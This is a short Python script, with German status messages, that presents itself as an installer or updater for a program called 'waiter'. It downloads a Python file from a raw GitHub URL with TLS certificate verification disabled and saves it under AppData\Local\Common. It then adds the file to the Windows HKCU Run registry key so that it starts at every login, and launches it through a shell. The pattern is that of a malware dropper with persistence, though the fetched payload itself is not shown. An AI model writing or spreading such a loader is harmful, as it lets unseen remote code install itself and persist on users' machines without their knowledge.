import pathlib as pl
import urllib.request
import subprocess
import os
import winreg
import ssl
import sys

APP_NAME = "waiter"
FILE_NAME = "waiter.py"
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME

BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"


APP_DIR = os.path.join(BASE_DIR, APP_NAME)
APP_PATH = os.path.join(APP_DIR, FILE_NAME)

os.makedirs(APP_DIR, exist_ok=True)

try:
    print(f"→ Lade {FILE_NAME} herunter ...")
    context = ssl._create_unverified_context()
    req = urllib.request.Request(UPDATE_URL)
    req.add_header("Pragma", "no-cache")
    with urllib.request.urlopen(req, timeout=15, context=context) as resp:
        if getattr(resp, "status", 200) != 200:
            print(f"Download fehlgeschlagen – Status: {getattr(resp,'status', 'unbekannt')}")
            exit(1)
        new_content = resp.read()

    with open(APP_PATH, "wb") as f:
        f.write(new_content)

    print(f"→ Erfolgreich heruntergeladen/aktualisiert: {APP_PATH}")

except Exception as e:
    print(f"Download/Fehler: {e}")
    exit(1)
    
key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
python_exe = sys.executable

value = f'"{python_exe}" "{APP_PATH}"'

try:
    key = winreg.OpenKey(  # type: ignore
        winreg.HKEY_CURRENT_USER,  # type: ignore
        key_path,
        0,
        winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
    )

    # Alten Wert löschen, falls vorhanden
    try:
        winreg.DeleteValue(key, APP_NAME)  # type: ignore
    except FileNotFoundError:
        pass

    winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, value)  # type: ignore
    winreg.CloseKey(key)  # type: ignore

except Exception as e:
    print(f"Registry Fehler: {e}")
    exit(1)

subprocess.Popen([APP_PATH], shell=True)